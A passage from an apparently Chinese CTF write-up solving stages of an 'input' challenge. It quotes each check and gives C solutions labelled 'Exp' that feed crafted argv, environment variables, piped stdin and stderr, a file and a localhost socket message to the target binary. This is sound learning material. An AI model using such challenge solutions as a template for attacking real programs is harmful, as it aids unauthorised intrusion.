<p>&#x6807;&#x51C6;&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x6D41;(0:stdin,1:stdout,2:stderr)</p>
<p>0&#x8FD8;&#x597D;&#x529E;&#xFF0C;2&#x600E;&#x4E48;&#x63A7;&#x5236;&#x5462;&#xFF1F;</p>
<p>&#x53EF;&#x4EE5;&#x5229;&#x7528;pipe&#x8FDB;&#x884C;&#x8FDB;&#x7A0B;&#x95F4;&#x901A;&#x4FE1;</p>
<p><a href="../assets/images/unix-pipe.gif" data-lightbox="f9db4f4b-965c-4d0d-b791-93c37345b720" data-title="Visualizing a pipe"><img src="../assets/images/unix-pipe.gif" alt="Visualizing a pipe"></a></p>
<p>&#x5177;&#x4F53;&#x8FC7;&#x7A0B;&#x5982;&#x4E0B;</p>
<blockquote>
<ul>
<li><p>Create two pipes: pipe2stdin and pipe2stderr</p>
</li>
<li><p>Fork the process</p>
</li>
<li><p>Child:</p>
<ul>
<li>write &#x201C;\x00\x0a\x00\xff&#x201D; to pipe2stdin</li>
<li>write &#x201C;\x00\x0a\x02\xff&#x201D; to pipe2stderr</li>
</ul>
</li>
<li><p>Parent:</p>
</li>
<li><ul>
<li>map the stdin to pipe2stdin</li>
<li>map the stderr to pipe2stderr</li>
<li>substitute the process with the execution of &#x2018;input&#x2019;</li>
</ul>
</li>
</ul>
</blockquote>
<p><strong>Exp</strong> </p>
<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
    <span class="hljs-keyword">char</span> *argv[<span class="hljs-number">101</span>]={<span class="hljs-string">&quot;./input&quot;</span>,
                     [<span class="hljs-number">1</span> ... <span class="hljs-number">99</span>]=<span class="hljs-string">&quot;A&quot;</span>,
                     <span class="hljs-literal">NULL</span>},
         *envp[<span class="hljs-number">2</span>];
    argv[<span class="hljs-string">&apos;A&apos;</span>]=<span class="hljs-string">&quot;\x00&quot;</span>;
    argv[<span class="hljs-string">&apos;B&apos;</span>]=<span class="hljs-string">&quot;\x20\x0a\x0d&quot;</span>;

    <span class="hljs-keyword">int</span> pipe_stdin[<span class="hljs-number">2</span>] = {<span class="hljs-number">-1</span>,<span class="hljs-number">-1</span>};
    <span class="hljs-keyword">int</span> pipe_stderr[<span class="hljs-number">2</span>] = {<span class="hljs-number">-1</span>,<span class="hljs-number">-1</span>};
    <span class="hljs-keyword">pid_t</span> pid_child;

    <span class="hljs-keyword">if</span>(pipe(pipe_stdin)&lt;<span class="hljs-number">0</span> || pipe(pipe_stderr)&lt;<span class="hljs-number">0</span>){
        perror(<span class="hljs-string">&quot;pipe creation failed&quot;</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }


    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STDIN_READ   pipe_stdin[0]<span class="hljs-comment">//Parent</span></span>
    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STDIN_WRITE  pipe_stdin[1]<span class="hljs-comment">//Child</span></span>
    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STDERR_READ  pipe_stderr[0]<span class="hljs-comment">//Parent</span></span>
    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STDERR_WRITE pipe_stderr[1]<span class="hljs-comment">//Child</span></span>

    <span class="hljs-keyword">if</span>((pid_child =fork())&lt;<span class="hljs-number">0</span>){
        perror(<span class="hljs-string">&quot;Cannot create fork child.&quot;</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }

    <span class="hljs-keyword">if</span>(pid_child == <span class="hljs-number">0</span>){<span class="hljs-comment">//child</span>
        sleep(<span class="hljs-number">2</span>);<span class="hljs-comment">//wait for pipe func</span>
        close(STDIN_READ);
        close(STDERR_READ);
        write(STDIN_WRITE,<span class="hljs-string">&quot;\x00\x0a\x00\xff&quot;</span>,<span class="hljs-number">4</span>);
        write(STDERR_WRITE,<span class="hljs-string">&quot;\x00\x0a\x02\xff&quot;</span>,<span class="hljs-number">4</span>);
    }<span class="hljs-keyword">else</span> {<span class="hljs-comment">//parent</span>
        close(STDIN_WRITE);
        close(STDERR_WRITE);
        dup2(STDIN_READ,<span class="hljs-number">0</span>);<span class="hljs-comment">//stdin&#x91CD;&#x5B9A;&#x5411;&#x5230;STDIN(pipe)</span>
        dup2(STDERR_READ,<span class="hljs-number">2</span>);<span class="hljs-comment">//stderr&#x91CD;&#x5B9A;&#x5411;&#x5230;STDERR(pipe)</span>
        execve(<span class="hljs-string">&quot;./input&quot;</span>,argv,envp);
            <span class="hljs-comment">//perror(&quot;Fail to excute the program&quot;);</span>
            <span class="hljs-comment">//exit(1);</span>
    }
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pipe link.\n&quot;</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>&#x53C2;&#x8003;&#x8D44;&#x6599;&#xFF1A;</p>
<p>Linux Socket&#x7F16;&#x7A0B; <a href="http://unixwiz.net/techtips/remap-pipe-fds.html" target="_blank">http://unixwiz.net/techtips/remap-pipe-fds.html</a></p>
<h3 id="stage3-env"><a name="stage3-env" class="anchor-navigation-ex-anchor" href="#stage3-env"><i class="fa fa-link" aria-hidden="true"></i></a>Stage3 env</h3>
<pre><code class="lang-c">    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;\xca\xfe\xba\xbe&quot;</span>, getenv(<span class="hljs-string">&quot;\xde\xad\xbe\xef&quot;</span>))) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Stage 3 clear!\n&quot;</span>);
</code></pre>
<p>&#x540C;agrv&#x4E00;&#x6837;&#xFF0C;&#x6539;&#x4E0B;envp&#x5C31;&#x884C;</p>
<p><strong>Exp</strong></p>
<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
    <span class="hljs-keyword">char</span> *argv[<span class="hljs-number">101</span>]={<span class="hljs-string">&quot;./input&quot;</span>,
                     [<span class="hljs-number">1</span> ... <span class="hljs-number">99</span>]=<span class="hljs-string">&quot;A&quot;</span>,
                     <span class="hljs-literal">NULL</span>},
         *envp[<span class="hljs-number">2</span>]={<span class="hljs-string">&quot;\xde\xad\xbe\xef=\xca\xfe\xba\xbe&quot;</span>,<span class="hljs-literal">NULL</span>};
    argv[<span class="hljs-string">&apos;A&apos;</span>]=<span class="hljs-string">&quot;\x00&quot;</span>;
    argv[<span class="hljs-string">&apos;B&apos;</span>]=<span class="hljs-string">&quot;\x20\x0a\x0d&quot;</span>;

    <span class="hljs-keyword">int</span> pipe_stdin[<span class="hljs-number">2</span>] = {<span class="hljs-number">-1</span>,<span class="hljs-number">-1</span>};
    <span class="hljs-keyword">int</span> pipe_stderr[<span class="hljs-number">2</span>] = {<span class="hljs-number">-1</span>,<span class="hljs-number">-1</span>};
    <span class="hljs-keyword">pid_t</span> pid_child;

    <span class="hljs-keyword">if</span>(pipe(pipe_stdin)&lt;<span class="hljs-number">0</span> || pipe(pipe_stderr)&lt;<span class="hljs-number">0</span>){
        perror(<span class="hljs-string">&quot;pipe creation failed&quot;</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }


    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STDIN_READ   pipe_stdin[0]</span>
    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STDIN_WRITE  pipe_stdin[1]</span>
    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STDERR_READ  pipe_stderr[0]</span>
    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STDERR_WRITE pipe_stderr[1]</span>

    <span class="hljs-keyword">if</span>( ( pid_child =fork() ) &lt; <span class="hljs-number">0</span> ){
        perror(<span class="hljs-string">&quot;Cannot create fork child.&quot;</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }

    <span class="hljs-keyword">if</span>(pid_child == <span class="hljs-number">0</span>){<span class="hljs-comment">//child</span>
        <span class="hljs-comment">//sleep(1);//wait for pipe func</span>
        close(STDIN_READ);
        close(STDERR_READ);
        write(STDIN_WRITE,<span class="hljs-string">&quot;\x00\x0a\x00\xff&quot;</span>,<span class="hljs-number">4</span>);
        write(STDERR_WRITE,<span class="hljs-string">&quot;\x00\x0a\x02\xff&quot;</span>,<span class="hljs-number">4</span>);
    }<span class="hljs-keyword">else</span> {<span class="hljs-comment">//parent</span>
        close(STDIN_WRITE);
        close(STDERR_WRITE);
        dup2(STDIN_READ,<span class="hljs-number">0</span>);
        dup2(STDERR_READ,<span class="hljs-number">2</span>);
        execve(<span class="hljs-string">&quot;./input&quot;</span>,argv,envp);
            perror(<span class="hljs-string">&quot;Fail to excute the program&quot;</span>);
            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pipe link.\n&quot;</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h3 id="stage-4-file"><a name="stage-4-file" class="anchor-navigation-ex-anchor" href="#stage-4-file"><i class="fa fa-link" aria-hidden="true"></i></a>Stage 4 file</h3>
<pre><code class="lang-c">    FILE* fp = fopen(<span class="hljs-string">&quot;\x0a&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);
    <span class="hljs-keyword">if</span>(!fp) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">if</span>( fread(buf, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, fp)!=<span class="hljs-number">1</span> ) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">if</span>( <span class="hljs-built_in">memcmp</span>(buf, <span class="hljs-string">&quot;\x00\x00\x00\x00&quot;</span>, <span class="hljs-number">4</span>) ) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    fclose(fp);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Stage 4 clear!\n&quot;</span>);
</code></pre>
<p>&#x5199;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;</p>
<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
    <span class="hljs-keyword">char</span> *argv[<span class="hljs-number">101</span>]={<span class="hljs-string">&quot;./input&quot;</span>,
                     [<span class="hljs-number">1</span> ... <span class="hljs-number">99</span>]=<span class="hljs-string">&quot;A&quot;</span>,
                     <span class="hljs-literal">NULL</span>},
         *envp[<span class="hljs-number">2</span>]={<span class="hljs-string">&quot;\xde\xad\xbe\xef=\xca\xfe\xba\xbe&quot;</span>,
                  <span class="hljs-literal">NULL</span>};
    argv[<span class="hljs-string">&apos;A&apos;</span>]=<span class="hljs-string">&quot;\x00&quot;</span>;
    argv[<span class="hljs-string">&apos;B&apos;</span>]=<span class="hljs-string">&quot;\x20\x0a\x0d&quot;</span>;

    <span class="hljs-keyword">int</span> pipe_stdin[<span class="hljs-number">2</span>] = {<span class="hljs-number">-1</span>,<span class="hljs-number">-1</span>};
    <span class="hljs-keyword">int</span> pipe_stderr[<span class="hljs-number">2</span>] = {<span class="hljs-number">-1</span>,<span class="hljs-number">-1</span>};
    <span class="hljs-keyword">pid_t</span> pid_child;

    <span class="hljs-keyword">if</span>(pipe(pipe_stdin)&lt;<span class="hljs-number">0</span> || pipe(pipe_stderr)&lt;<span class="hljs-number">0</span>){
        perror(<span class="hljs-string">&quot;pipe creation failed&quot;</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }


    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STDIN_READ   pipe_stdin[0]</span>
    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STDIN_WRITE  pipe_stdin[1]</span>
    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STDERR_READ  pipe_stderr[0]</span>
    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STDERR_WRITE pipe_stderr[1]</span>

    <span class="hljs-keyword">if</span>( ( pid_child =fork() ) &lt; <span class="hljs-number">0</span> ){
        perror(<span class="hljs-string">&quot;Cannot create fork child.&quot;</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }

    <span class="hljs-keyword">if</span>(pid_child == <span class="hljs-number">0</span>){<span class="hljs-comment">//child</span>
        <span class="hljs-comment">//sleep(1);//wait for pipe func</span>
        close(STDIN_READ);
        close(STDERR_READ);
        write(STDIN_WRITE,<span class="hljs-string">&quot;\x00\x0a\x00\xff&quot;</span>,<span class="hljs-number">4</span>);
        write(STDERR_WRITE,<span class="hljs-string">&quot;\x00\x0a\x02\xff&quot;</span>,<span class="hljs-number">4</span>);
    }<span class="hljs-keyword">else</span> {<span class="hljs-comment">//parent</span>
        close(STDIN_WRITE);
        close(STDERR_WRITE);
        dup2(STDIN_READ,<span class="hljs-number">0</span>);<span class="hljs-comment">//recovery</span>
        dup2(STDERR_READ,<span class="hljs-number">2</span>);
        execve(<span class="hljs-string">&quot;./input&quot;</span>,argv,envp);
    }
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pipe linked.\n&quot;</span>);

    FILE *fp= fopen(<span class="hljs-string">&quot;\x0a&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>);
    <span class="hljs-keyword">if</span>(!fp) perror(<span class="hljs-string">&quot;Can not open file.&quot;</span>);
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Open file success.&quot;</span>);
    fwrite(<span class="hljs-string">&quot;\x00\x00\x00\x00&quot;</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,fp);
    fclose(fp);

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h3 id="stage-5-network"><a name="stage-5-network" class="anchor-navigation-ex-anchor" href="#stage-5-network"><i class="fa fa-link" aria-hidden="true"></i></a>Stage 5 network</h3>
<pre><code class="lang-c">    <span class="hljs-comment">// network</span>
    <span class="hljs-keyword">int</span> sd, cd;
    <span class="hljs-keyword">struct</span> sockaddr_in saddr, caddr;
    sd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);
    <span class="hljs-keyword">if</span>(sd == <span class="hljs-number">-1</span>){
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;socket error, tell admin\n&quot;</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
    saddr.sin_family = AF_INET;
    saddr.sin_addr.s_addr = INADDR_ANY;
    saddr.sin_port = htons( atoi(argv[<span class="hljs-string">&apos;C&apos;</span>]) );
    <span class="hljs-keyword">if</span>(bind(sd, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;saddr, <span class="hljs-keyword">sizeof</span>(saddr)) &lt; <span class="hljs-number">0</span>){
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bind error, use another port\n&quot;</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
    }
    listen(sd, <span class="hljs-number">1</span>);
    <span class="hljs-keyword">int</span> c = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr_in);
    cd = accept(sd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;caddr, (<span class="hljs-keyword">socklen_t</span>*)&amp;c);
    <span class="hljs-keyword">if</span>(cd &lt; <span class="hljs-number">0</span>){
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;accept error, tell admin\n&quot;</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
    <span class="hljs-keyword">if</span>( recv(cd, buf, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>) != <span class="hljs-number">4</span> ) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">memcmp</span>(buf, <span class="hljs-string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="hljs-number">4</span>)) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Stage 5 clear!\n&quot;</span>);
</code></pre>
<p>&#x8981;&#x6C42;&#x5199;&#x4E2A;socket&#x901A;&#x4FE1;</p>
<p>&#x4E00;&#x4E9B;&#x524D;&#x7F6E;&#x77E5;&#x8BC6;&#xFF1A;</p>
<pre><code>AF_UNIX&#xFF08;&#x672C;&#x673A;&#x901A;&#x4FE1;&#xFF09;
AF_INET&#xFF08;TCP/IP &#x2013; IPv4&#xFF09;
AF_INET6&#xFF08;TCP/IP &#x2013; IPv6&#xFF09;
AF = Address Family
PF = Protocol Family

socket&#x7F16;&#x7A0B;&#x4E2D;&#x9700;&#x8981;&#x7528;&#x5230;&#x7684;&#x5934;&#x6587;&#x4EF6;
sys/types.h&#xFF1A;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x5B9A;&#x4E49;
sys/socket.h&#xFF1A;&#x63D0;&#x4F9B;socket&#x51FD;&#x6570;&#x53CA;&#x6570;&#x636E;&#x7ED3;&#x6784;
netinet/in.h&#xFF1A;&#x5B9A;&#x4E49;&#x6570;&#x636E;&#x7ED3;&#x6784;sockaddr_in
arpa/inet.h&#xFF1A;&#x63D0;&#x4F9B;IP&#x5730;&#x5740;&#x8F6C;&#x6362;&#x51FD;&#x6570;
netdb.h&#xFF1A;&#x63D0;&#x4F9B;&#x8BBE;&#x7F6E;&#x53CA;&#x83B7;&#x53D6;&#x57DF;&#x540D;&#x7684;&#x51FD;&#x6570;
sys/ioctl.h&#xFF1A;&#x63D0;&#x4F9B;&#x5BF9;I/O&#x63A7;&#x5236;&#x7684;&#x51FD;&#x6570;
sys/poll.h&#xFF1A;&#x63D0;&#x4F9B;socket&#x7B49;&#x5F85;&#x6D4B;&#x8BD5;&#x673A;&#x5236;&#x7684;&#x51FD;&#x6570;
</code></pre><p>&#x7167;&#x7740;&#x5927;&#x4F6C;&#x7684;wp&#x5199;&#x4E86;&#x4E00;&#x904D;</p>
<p><strong>Exp</strong></p>
<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;sys/socket.h&gt;</span>//socket</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;netinet/in.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;netdb.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;arpa/inet.h&gt;</span></span>

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
    <span class="hljs-keyword">char</span> *argv[<span class="hljs-number">101</span>]={<span class="hljs-string">&quot;./input&quot;</span>,
                     [<span class="hljs-number">1</span> ... <span class="hljs-number">99</span>]=<span class="hljs-string">&quot;A&quot;</span>,
                     <span class="hljs-literal">NULL</span>},
         *envp[<span class="hljs-number">2</span>]={<span class="hljs-string">&quot;\xde\xad\xbe\xef=\xca\xfe\xba\xbe&quot;</span>,
                  <span class="hljs-literal">NULL</span>};

    argv[<span class="hljs-string">&apos;A&apos;</span>]=<span class="hljs-string">&quot;\x00&quot;</span>;
    argv[<span class="hljs-string">&apos;B&apos;</span>]=<span class="hljs-string">&quot;\x20\x0a\x0d&quot;</span>;
    argv[<span class="hljs-string">&apos;C&apos;</span>]=<span class="hljs-string">&quot;55555&quot;</span>;<span class="hljs-comment">//socket&#x7AEF;&#x53E3;</span>

    <span class="hljs-keyword">int</span> pipe_stdin[<span class="hljs-number">2</span>] = {<span class="hljs-number">-1</span>,<span class="hljs-number">-1</span>};
    <span class="hljs-keyword">int</span> pipe_stderr[<span class="hljs-number">2</span>] = {<span class="hljs-number">-1</span>,<span class="hljs-number">-1</span>};
    <span class="hljs-keyword">pid_t</span> pid_child;

    <span class="hljs-keyword">if</span>(pipe(pipe_stdin)&lt;<span class="hljs-number">0</span> || pipe(pipe_stderr)&lt;<span class="hljs-number">0</span>){
        perror(<span class="hljs-string">&quot;pipe creation failed&quot;</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }


    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STDIN_READ   pipe_stdin[0]</span>
    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STDIN_WRITE  pipe_stdin[1]</span>
    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STDERR_READ  pipe_stderr[0]</span>
    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STDERR_WRITE pipe_stderr[1]</span>

    <span class="hljs-keyword">if</span>( ( pid_child =fork() ) &lt; <span class="hljs-number">0</span> ){
        perror(<span class="hljs-string">&quot;Cannot create fork child.&quot;</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }

    <span class="hljs-keyword">if</span>(pid_child == <span class="hljs-number">0</span>){<span class="hljs-comment">//child</span>
        <span class="hljs-comment">//sleep(1);//wait for pipe func</span>
        close(STDIN_READ);
        close(STDERR_READ);
        write(STDIN_WRITE,<span class="hljs-string">&quot;\x00\x0a\x00\xff&quot;</span>,<span class="hljs-number">4</span>);
        write(STDERR_WRITE,<span class="hljs-string">&quot;\x00\x0a\x02\xff&quot;</span>,<span class="hljs-number">4</span>);
    }<span class="hljs-keyword">else</span> {<span class="hljs-comment">//parent</span>
        close(STDIN_WRITE);
        close(STDERR_WRITE);
        dup2(STDIN_READ,<span class="hljs-number">0</span>);
        dup2(STDERR_READ,<span class="hljs-number">2</span>);
        execve(<span class="hljs-string">&quot;./input&quot;</span>,argv,envp);
    }
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pipe linked.\n&quot;</span>);

    FILE *fp= fopen(<span class="hljs-string">&quot;\x0a&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>);
    <span class="hljs-keyword">if</span>(!fp) perror(<span class="hljs-string">&quot;Can not open file.&quot;</span>);
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Open file success.&quot;</span>);
    fwrite(<span class="hljs-string">&quot;\x00\x00\x00\x00&quot;</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,fp);
    fclose(fp);

    sleep(<span class="hljs-number">2</span>);
    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">10</span>]={<span class="hljs-number">0</span>};
    <span class="hljs-keyword">struct</span> sockaddr_in servaddr;
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(atoi(argv[<span class="hljs-string">&apos;C&apos;</span>]));
    servaddr.sin_addr.s_addr= inet_addr(<span class="hljs-string">&quot;127.0.0.1&quot;</span>);

    <span class="hljs-keyword">int</span> sockfd=socket(PF_INET,SOCK_STREAM,<span class="hljs-number">0</span>);
    <span class="hljs-keyword">if</span>(sockfd&lt;<span class="hljs-number">0</span>) {
        perror(<span class="hljs-string">&quot;\xde\xad\xbe\xef&quot;</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    <span class="hljs-keyword">if</span>(connect(sockfd,(<span class="hljs-keyword">struct</span> sockaddr *) &amp;servaddr,<span class="hljs-keyword">sizeof</span>(servaddr))&lt;<span class="hljs-number">0</span>){
        perror(<span class="hljs-string">&quot;connect error.&quot;</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;socket connect.\n&quot;</span>);
    <span class="hljs-built_in">strcpy</span>(buf,<span class="hljs-string">&quot;\xde\xad\xbe\xef&quot;</span>);
    send(sockfd,buf,<span class="hljs-built_in">strlen</span>(buf),<span class="hljs-number">0</span>);
    close(sockfd);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<blockquote>
<p>&#x5982;&#x679C;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5728;&#x8C03;&#x7528;socket()&#x3001;bind()&#x4E4B;&#x540E;&#x5C31;&#x4F1A;&#x8C03;&#x7528;listen()&#x6765;&#x76D1;&#x542C;&#x8FD9;&#x4E2A;socket&#xFF0C;&#x5982;&#x679C;&#x5BA2;&#x6237;&#x7AEF;&#x8FD9;&#x65F6;&#x8C03;&#x7528;connect()&#x53D1;&#x51FA;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x5C31;&#x4F1A;&#x63A5;&#x6536;&#x5230;&#x8FD9;&#x4E2A;&#x8BF7;&#x6C42;&#x3002;</p>
<pre><code>int listen(int sockfd, int backlog);
int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
</code></pre><p>listen&#x51FD;&#x6570;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x5373;&#x4E3A;&#x8981;&#x76D1;&#x542C;&#x7684;socket&#x63CF;&#x8FF0;&#x5B57;&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x4E3A;&#x76F8;&#x5E94;socket&#x53EF;&#x4EE5;&#x6392;&#x961F;&#x7684;&#x6700;&#x5927;&#x8FDE;&#x63A5;&#x4E2A;&#x6570;&#x3002;socket()&#x51FD;&#x6570;&#x521B;&#x5EFA;&#x7684;socket&#x9ED8;&#x8BA4;&#x662F;&#x4E00;&#x4E2A;&#x4E3B;&#x52A8;&#x7C7B;&#x578B;&#x7684;&#xFF0C;listen&#x51FD;&#x6570;&#x5C06;socket&#x53D8;&#x4E3A;&#x88AB;&#x52A8;&#x7C7B;&#x578B;&#x7684;&#xFF0C;&#x7B49;&#x5F85;&#x5BA2;&#x6237;&#x7684;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x3002;
connect&#x51FD;&#x6570;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x5373;&#x4E3A;&#x5BA2;&#x6237;&#x7AEF;&#x7684;socket&#x63CF;&#x8FF0;&#x5B57;&#xFF0C;&#x7B2C;&#x4E8C;&#x53C2;&#x6570;&#x4E3A;&#x670D;&#x52A1;&#x5668;&#x7684;socket&#x5730;&#x5740;&#xFF0C;&#x7B2C;&#x4E09;&#x4E2A;&#x53C2;&#x6570;&#x4E3A;socket&#x5730;&#x5740;&#x7684;&#x957F;&#x5EA6;&#x3002;&#x5BA2;&#x6237;&#x7AEF;&#x901A;&#x8FC7;&#x8C03;&#x7528;connect&#x51FD;&#x6570;&#x6765;&#x5EFA;&#x7ACB;&#x4E0E;TCP&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FDE;&#x63A5;&#x3002;</p>
</blockquote>
<p>&#x53C2;&#x8003;&#x8D44;&#x6599;</p>
<p>socket &#x7F16;&#x7A0B; <a href="https://www.cnblogs.com/skynet/archive/2010/12/12/1903949.html" target="_blank">https://www.cnblogs.com/skynet/archive/2010/12/12/1903949.html</a></p>
<p>socket&#x7F16;&#x7A0B;&#x4E2D;write&#x3001;read&#x548C;send&#x3001;recv&#x4E4B;&#x95F4;&#x7684;&#x533A;&#x522B; <a href="https://www.cnblogs.com/George1994/p/6731091.html" target="_blank">https://www.cnblogs.com/George1994/p/6731091.html</a></p>
<h3 id="final"><a name="final" class="anchor-navigation-ex-anchor" href="#final"><i class="fa fa-link" aria-hidden="true"></i></a>Final</h3>
<p>&#x5728;&#x672C;&#x5730;&#x4E0A;&#x53EF;&#x4EE5;&#x8FC7;&#x4E86;</p>
<p>&#x4F46;&#x662F;&#x5728;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x8FD8;&#x9700;&#x8981;&#x4E00;&#x4E9B;&#x6539;&#x52A8;</p>
